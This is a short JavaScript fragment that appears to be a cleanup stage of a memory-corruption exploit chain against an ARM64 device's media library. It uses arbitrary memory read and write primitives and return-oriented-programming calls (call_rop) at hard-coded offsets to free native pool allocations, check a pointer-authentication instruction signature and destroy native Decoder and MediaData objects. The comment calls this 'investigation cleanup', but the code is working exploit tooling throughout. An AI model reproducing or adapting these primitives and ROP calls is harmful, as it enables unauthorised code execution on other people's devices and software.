/* Release the retained probe's original built-in-pool allocation with its own
   allocator. This is investigation cleanup, not an application initialization path. */
(async function(){
 var P=window.__moonlightConfigProbe,N=P.N,info=malloc(64),page=malloc(8);
 function range(p,n,perm){if(call_rop(sdk_base+0x168b0cn,info,page,p)&0x3fffffn)throw Error('Query failed');if((Number(read32(info+24n))&perm)!==perm||p<read64(info)||p+BigInt(n)>read64(info)+read64(info+8n))throw Error('Range rejected');}
 var root=read64(P.config);range(root,0x608,1);var value=read64(root+0x180n);range(value,24,1);var buffer=read64(value+8n);range(buffer,64,3);var data=read64(buffer+0x28n);
 var start=N.movieBase+0x5f54000n;if(data<start||data+38n>start+0x500000n||read32(buffer+4n)!==38n||read8(buffer+0x10n)!==1n)throw Error('Retained allocation does not match evidence');
 range(N.movieBase+0x13d3f0n,8,5);if(read32(N.movieBase+0x13d3f0n)!==0xd503237fn)throw Error('Pool free signature mismatch');
 await log('MOONLIGHT_CONFIG_ORIGINAL_POOL_FREE_BEGIN');
 call_rop(N.movieBase+0x13d3f0n,N.movieBase+0x5f532e8n,data);
 write64(buffer+0x28n,0n);write8(buffer+0x10n,0n);
 await log('MOONLIGHT_CONFIG_ORIGINAL_POOL_FREE_END');
 N.movieCall('_ZN5movie7DecoderD1Ev',[P.decoder]);await log('MOONLIGHT_CONFIG_DECODER_DESTROYED');
 N.movieCall('_ZN5movie9MediaDataD1Ev',[P.config]);await log('MOONLIGHT_CONFIG_METADATA_DESTROYED');
 for(var p of P.owned.reverse())free(p);free(page);free(info);delete window.__moonlightConfigProbe;await log('MOONLIGHT_CONFIG_RETAINED_CLEANUP_END');
})();
